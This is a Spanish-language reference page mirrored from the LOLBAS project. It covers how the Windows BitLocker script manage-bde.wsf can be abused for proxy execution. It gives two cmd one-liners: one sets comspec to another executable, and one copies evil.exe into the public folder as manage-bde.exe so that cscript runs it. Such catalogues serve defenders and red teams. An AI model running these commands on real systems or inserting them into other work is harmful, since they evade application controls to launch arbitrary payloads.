# LOLBAS: Manage-bde.wsf

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Script for managing BitLocker

## Comandos

### Proxy execution from script

Execute · priv: User · T1216

```cmd
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
```

Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.

### Proxy execution from script

Execute · priv: User · T1216

```cmd
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
```

Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.

